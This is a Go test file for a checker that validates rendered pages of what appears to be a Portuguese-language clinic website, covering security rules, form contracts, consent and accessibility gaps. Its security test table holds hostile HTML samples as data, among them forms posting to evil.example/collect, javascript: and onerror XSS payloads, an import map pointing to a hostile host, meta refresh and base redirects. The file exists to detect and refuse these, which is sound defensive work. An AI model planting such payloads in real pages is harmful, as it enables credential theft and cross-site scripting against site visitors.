package site

import (
	"slices"
	"strings"
	"testing"

	"vozko/domain/sitehtml"
)

func page(t *testing.T, route, source string) RenderedPage {
	t.Helper()
	doc, err := sitehtml.Parse(source)
	if err != nil {
		t.Fatal(err)
	}
	return RenderedPage{Route: route, Document: doc}
}

func issueCodes(issues []Issue) []string {
	out := []string{}
	for _, issue := range issues {
		out = append(out, issue.Code)
	}
	return out
}

const cleanHome = `<header><nav><a href="/">Início</a></nav></header>
<main>
<section data-vz-node="src/pages/Home.jsx#10"><h1>Sorrisos</h1><img src="/media/a.webp" alt="Consultório"></section>
<form data-vz-form="contato">
  <input type="tel" name="lead.phone" required>
  <label><input type="checkbox" name="consent"> Li a <a href="/privacidade">Política de Privacidade</a></label>
  <button>Enviar</button>
</form>
<script type="module" src="/assets/index-9f1.js"></script>
<script type="application/ld+json">{"@context":"https://schema.org"}</script>
<img src="data:image/png;base64,AAAA" alt="">
<form action="/busca"><input name="q"></form>
<iframe src="https://www.youtube-nocookie.com/embed/abc" title="Vídeo"></iframe>
<iframe src="https://www.google.com/maps/embed?pb=1" title="Mapa"></iframe>
</main>`

func TestCleanRenderedPagesHaveNoIssues(t *testing.T) {
	pages := []RenderedPage{page(t, "/", cleanHome)}
	checked := CheckPages(pages)
	issues, manifests := checked.Issues, checked.Manifests
	if len(issues) != 0 {
		t.Fatalf("got %+v", issues)
	}
	if len(manifests) != 1 || manifests[0].ID != "contato" {
		t.Fatalf("got %+v", manifests)
	}
	if gaps := checked.OpenGaps(pages, Settings{}); len(gaps) != 0 {
		t.Fatalf("got %+v", gaps)
	}
}

func TestCheckPagesRefusesWhatPagesMustNeverCarry(t *testing.T) {
	cases := map[string]struct {
		html string
		code string
	}{
		"password field":         {`<input type="password" name="senha">`, CodeCredentialFieldForbidden},
		"card number":            {`<input name="numero" autocomplete="cc-number">`, CodeCredentialFieldForbidden},
		"card in token list":     {`<input name="n" autocomplete="section-pay billing cc-csc">`, CodeCredentialFieldForbidden},
		"new password":           {`<input name="n" autocomplete="new-password">`, CodeCredentialFieldForbidden},
		"external form":          {`<form action="https://evil.example/collect"><input name="q"></form>`, CodeFormActionForbidden},
		"protocol relative form": {`<form action="//evil.example/collect"></form>`, CodeFormActionForbidden},
		"external formaction":    {`<form><button formaction="https://evil.example">x</button></form>`, CodeFormActionForbidden},
		"remote script":          {`<script src="https://cdn.example/x.js"></script>`, CodeScriptSourceForbidden},
		"protocol relative src":  {`<script src="//cdn.example/x.js"></script>`, CodeScriptSourceForbidden},
		"inline script":          {`<script>fetch("https://x")</script>`, CodeScriptInlineForbidden},
		"inline module":          {`<script type="module">import x from "y"</script>`, CodeScriptInlineForbidden},
		"import map":             {`<script type="importmap">{"imports":{"react":"https://evil/x.js"}}</script>`, CodeScriptInlineForbidden},
		"event handler":          {`<img src="/a.png" alt="a" onerror="alert(1)">`, CodeEventHandlerForbidden},
		"javascript link":        {`<a href=" JavaScript:alert(1)">x</a>`, CodeURLForbidden},
		"data html link":         {`<a href="data:text/html,<script>x</script>">x</a>`, CodeURLForbidden},
		"vbscript src":           {`<iframe src="vbscript:x"></iframe>`, CodeURLForbidden},
		"base element":           {`<base href="https://evil.example/">`, CodeURLForbidden},
		"meta refresh":           {`<meta http-equiv="refresh" content="0;url=https://evil.example">`, CodeURLForbidden},
		"unknown form target":    {`<form data-vz-form="a"><input name="cpf"></form>`, CodeFormFieldUnknown},
		"frame outside the list": {`<iframe src="https://evil.example/login"></iframe>`, CodeFrameSourceForbidden},
		"youtube with cookies":   {`<iframe src="https://www.youtube.com/embed/x"></iframe>`, CodeFrameSourceForbidden},
		"frame without source":   {`<iframe></iframe>`, CodeFrameSourceForbidden},
		"inline frame document":  {`<iframe src="https://www.youtube-nocookie.com/embed/x" srcdoc="<input type=password>"></iframe>`, CodeFrameSourceForbidden},
		"legacy frame":           {`<frame src="https://evil.example/"></frame>`, CodeFrameSourceForbidden},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			issues := CheckPages([]RenderedPage{page(t, "/", c.html)}).Issues
			if len(issues) == 0 || issues[0].Code != c.code || issues[0].Route != "/" {
				t.Fatalf("got %+v", issues)
			}
			if IsGap(issues[0].Code) {
				t.Fatal("security rules are structural")
			}
		})
	}
}

func TestCheckPagesRefusesOneFormIDWithTwoContracts(t *testing.T) {
	a := `<form data-vz-form="contato"><input type="tel" name="lead.phone"></form>`
	b := `<form data-vz-form="contato"><input type="email" name="lead.email"></form>`
	issues := CheckPages([]RenderedPage{page(t, "/", a), page(t, "/obrigado", b)}).Issues
	if len(issues) != 1 || issues[0].Code != CodeFormIDDuplicate || issues[0].Route != "/obrigado" {
		t.Fatalf("got %+v", issues)
	}
	shared := CheckPages([]RenderedPage{page(t, "/", a), page(t, "/obrigado", a)})
	same, manifests := shared.Issues, shared.Manifests
	if len(same) != 0 || len(manifests) != 1 {
		t.Fatalf("a shared header form is one form: %+v %+v", same, manifests)
	}
}

func TestOpenGapsListDraftGapsOncePerSourceNode(t *testing.T) {
	home := `<section data-vz-node="src/pages/Home.jsx#0">
<h1 style="opacity: 0; transform: translateY(20px)">Sorrisos</h1>
<img src="/a.webp" data-vz-node="src/components/Card.jsx#5"><img src="/b.webp" data-vz-node="src/components/Card.jsx#5">
<a data-vz-node="src/components/Cta.jsx#3">Agende</a>
<a href="#">Topo</a>
</section>
<form data-vz-form="contato"><input name="lead.name"></form>`
	about := `<section><h1>Sobre</h1><a data-vz-node="src/components/Cta.jsx#3">Agende</a></section><footer><p style="opacity:0">rodapé</p></footer>`
	pages := []RenderedPage{page(t, "/", home), page(t, "/sobre", about)}
	gaps := CheckPages(pages).OpenGaps(pages, Settings{Integrations: Integrations{GA4: "G-AB12CD34"}})
	got := issueCodes(gaps)
	want := []string{CodeAltMissing, CodeLinkEmpty, CodeLinkEmpty, CodeConsentRequired, CodeFormIdentityMissing, CodePrivacyLinkMissing, CodeConsentBannerMissing, CodeInvisibleWithoutJS}
	slices.Sort(got)
	slices.Sort(want)
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("got  %v\nwant %v", got, want)
	}
	for _, gap := range gaps {
		if !IsGap(gap.Code) {
			t.Fatalf("%s is not a gap", gap.Code)
		}
	}
}

func TestInvisibleWithoutJSOnlyCountsAboveTheFoldText(t *testing.T) {
	cases := map[string]struct {
		html string
		gap  bool
	}{
		"hidden hero heading":  {`<section><h1 style="opacity:0">Oi</h1></section>`, true},
		"hidden hero wrapper":  {`<main style="opacity: 0 !important"><section><h1>Oi</h1></section></main>`, true},
		"hidden hero subtitle": {`<header><p style="OPACITY:0;">Bem-vindo</p></header><section><h1>Oi</h1></section>`, true},
		"faded but visible":    {`<section><h1 style="opacity:0.5">Oi</h1></section>`, false},
		"hidden decoration":    {`<section><h1>Oi</h1><div style="opacity:0"></div></section>`, false},
		"hidden below fold":    {`<section><h1>Oi</h1></section><section><p style="opacity:0">depois</p></section>`, false},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			pages := []RenderedPage{page(t, "/", c.html)}
			gaps := CheckPages(pages).OpenGaps(pages, Settings{})
			found := slices.Contains(issueCodes(gaps), CodeInvisibleWithoutJS)
			if found != c.gap {
				t.Fatalf("got %+v", gaps)
			}
		})
	}
}

func TestRenderedChecksReportHeadingStructure(t *testing.T) {
	checks := RenderedChecks([]RenderedPage{
		page(t, "/", `<h1>A</h1><h3>pulou</h3><h1>de novo</h1><a href="/x"></a>`),
		page(t, "/sobre", `<h2>sem h1</h2>`),
	})
	got := []string{}
	for _, c := range checks {
		got = append(got, c.Route+":"+c.Code)
	}
	if strings.Join(got, ",") != "/:heading_order,/:h1_repeated,/:link_unnamed,/sobre:h1_missing" {
		t.Fatalf("got %v", got)
	}
}

func TestCheckedPagesFeedTheirFormsToTheOpenGaps(t *testing.T) {
	form := `<h1>Sobre</h1><form data-vz-form="contato" data-vz-node="pages/sobre.html#4"><input type="text" name="lead.name"></form>`
	pages := []RenderedPage{page(t, "/", "<h1>Início</h1>"), page(t, "/sobre", form), page(t, "/contato", form)}
	checked := CheckPages(pages)
	if len(checked.Manifests) != 1 || checked.Manifests[0].ID != "contato" {
		t.Fatalf("got %+v", checked.Manifests)
	}
	var routes []string
	for _, gap := range checked.OpenGaps(pages, Settings{}) {
		routes = append(routes, gap.Code+"@"+gap.Route)
	}
	want := "consent_required@/sobre,form_identity_missing@/sobre,privacy_link_missing@"
	if strings.Join(routes, ",") != want {
		t.Fatalf("got  %s\nwant %s", strings.Join(routes, ","), want)
	}
}
